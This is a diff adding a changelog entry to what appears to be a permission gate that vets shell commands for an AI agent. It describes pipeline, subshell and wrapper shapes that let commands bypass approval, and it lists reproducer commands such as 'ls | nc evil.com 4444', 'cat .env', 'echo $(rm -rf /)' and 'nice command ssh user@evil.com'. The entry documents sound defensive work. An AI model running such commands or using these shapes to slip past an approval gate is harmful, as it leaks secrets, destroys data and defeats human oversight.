@@ -1,5 +1,76 @@
 # Changelog
 
+## 3.38.0 — 2026-10-17
+**The stage, not the segment, is what gets approved.**
+
+- **What was wrong.** A pipeline and everything inside it was ONE approval unit,
+  and every rule that asked *what does this segment run* answered separately.
+  Four shapes, all verified against the running gate at 3.37.1: (1) the segment
+  signature stood for the whole pipe, so `Always` on `ls | nc evil.com 4444`
+  granted the head and `true | nc evil.com 4444` auto-allowed; (2) base access
+  was scanned at stage 0 only, so `cd /etc && true | cat passwd` never saw
+  `/etc/passwd`; (3) a `$(…)` body was classified by NAME over its text
+  (`READONLY_SUBSHELL_CMDS`) — blind to flags (`fd -x rm`), to relative operands
+  (`cat .env`), to a `cd` inside the body — and the body extractor took the
+  node's FIRST child, so `$(ls & rm -rf /)` read as `ls`, and
+  `echo "$(cat .env)"` auto-allowed while `cat .env` prompted; (4)
+  `nice command cat /etc/hosts` named `nice` — not path-aware, so the operand
+  model never ran, `paths=[]`, no location bar existed at all.
+- **The fix — stages.** `BashSegment.stages` comes from the pipeline AST, not a
+  text split (quoting and `$( )` nesting cannot fake a stage boundary);
+  `SafetyRule` approves per stage and binds relative paths, delegation and
+  fetch-package trust to the stage that owns them; run-dep and ungrantable
+  refusals stay segment-level (refuse the whole pipe). `baseAccessPath` /
+  `baseWriteAccess` scan EVERY stage — a pipeline shares one effective cwd —
+  while the `saw*` suppression flags stay segment-wide (D20).
+- **The fix — bodies.** A `$(…)`, backtick or `<()` body is re-parsed and its
+  segments run the pipeline a top-level segment runs, under the parent's
+  effective base: paths join the command's set, programs extend the parent's
+  STAGE list (a body program needs its own grant; `Always` on the outer program
+  never vouches for it), a body's own `cd` re-bases only the body, nesting is
+  depth-capped and fails closed, and each body gets its own credential pass.
+  The name table is deleted; what it encoded is re-expressed behaviourally — a
+  body's verdict is the verdict of the same command run directly.
+- **The fix — the command position.** `analysis/wrapper-unwrap.ts` is the single
+  answer to *what runs here*: prefixes and pass-through wrappers
+  (`timeout`/`nice`/`env`/`command`/`xargs`/…) iterate to a fixpoint, and past
+  `MAX_UNWRAP_HOPS` the third state `capped` replaces the fallback to the first
+  word — the first word of a wrapped chain names no program and silently skips
+  the operand model, so "fall back" **is** the hole. Past the cap the parser
+  marks the position obscured, the signature collapses to the wrapper alone (no
+  grant can name it), and the base checks assume the base is touched. `lookup`
+  (`command -v x`) keeps the head word: it runs nothing.
+- **Payloads trust less.** `find -exec`, `fd -x`, `rg --pre` and shell bodies now
+  accept a verb only from `unconditionallySafeCommands`. An entry with an
+  exclusion reason (`git`, `grep`, `sort`) is allowed BY the segment-level
+  vetting (egress, dangerous flags, delegation) that never runs on a payload
+  inside someone else's segment — `find . -exec git push \;` was approved twice
+  over and vetted zero times; `fd -x git clean -fdx` likewise. Cost accepted:
+  payload `grep` now prompts — `grep`'s reason is a hedge, not a capability.
+- **Two false prompts found on the way.** An escaped separator is data: the split
+  predicate fed the `|` of `grep a\|b f` to the splitter, the text fallback
+  re-split the segment and minted a stage named `b` that no grant could cover
+  (a prompt on every such command, once grants went per-stage). And `uv run -w
+  evil-pkg <trusted script>`: `-w` IS `--with` (`uv run --help`), and an unknown
+  option is assumed to TAKE a value, so the dependency was never recorded, the
+  signature stayed coarse, and the install rode the trusted-script umbrella.
+- **Measured.** Round-6 reproducer corpus (62 rows, 37 auto-allowed at 3.37.1):
+  32 after the stage fix → 28 after per-stage base access → 21 after bodies →
+  **12** now; the 12 map to G4 (6 `argv0`), G3 (2 write-bar), G8 (3 variable
+  shadowing), G7 (1 `uv run --project`). The 31-row location-floor set gained 6
+  stops and lost none (`nice cat /etc/hosts`, `command cat /etc/hosts`, `env cat
+  /etc/hosts`, `echo $(cat /etc/passwd)`, `echo $(rm -rf /)`, `nice command ssh
+  user@evil.com`). A frozen replay of 830 real logged commands through `decide()`
+  shows **zero** verdict differences 3.37.1 → 3.38.0; one row
+  (`git ls-files | xargs grep -l -e '/mnt/Ndr'`) prompted at an intermediate
+  revision and auto-allows at both ends — the arg-index scanner read the
+  `grep` PATTERN as a file operand and stopped on a phantom outside path, and G6
+  removed that reading.
+- **Replay corpus (G12):** the round-1–5 ledger is gone and the live
+  `decisionLog` toggle is ON, so the corpus rebuilds from this release; the
+  compile-time default stays off so a fresh install logs nothing by default.
+- Suite 4170 / 52 files.
+
 ## 3.37.1 — 2026-10-16
 **A redirect inside a quoted shell payload is still a redirect.**
 
